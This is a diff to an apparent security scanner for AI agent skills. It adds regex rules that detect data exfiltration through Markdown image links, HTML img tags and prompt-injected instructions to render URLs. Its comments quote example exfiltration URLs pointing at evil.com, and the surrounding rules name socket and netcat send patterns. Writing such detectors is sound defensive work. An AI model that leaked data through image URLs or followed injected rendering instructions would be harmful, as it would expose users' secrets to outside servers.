@@ -69,6 +69,12 @@ _PATTERN_RULES: list[tuple[str, str, str, list[str], str, str]] = [
             r"socket\.connect\s*\(",
             r"\bnc(?:at)?\b.*\b(?:--send-only|--recv-only)\b",
             r"httpx\.post\s*\(",
+            # Markdown image/link exfiltration: ![img](https://evil.com?data=...)
+            r"!\[.*?\]\(https?://[^\s)]+\?[^\s)]*(?:data|content|file|secret|key|token|d)=",
+            # HTML img tag exfiltration: <img src="https://evil.com?data=...">
+            r"<img\s+[^>]*src=[\"']https?://[^\"']+\?[^\"']*(?:data|content|file|secret|key|token|d)=",
+            # Instruction to render URLs with dynamic content (prompt injection for exfil)
+            r"(?:render|display|show|include)\s+(?:an?\s+)?(?:image|img|markdown)\s+(?:tag|link)?\s*.*https?://",
         ],
         "This skill sends data to an external server: {match}",
         "Remove this skill. It exfiltrates data to an external endpoint. Check for compromised credentials.",
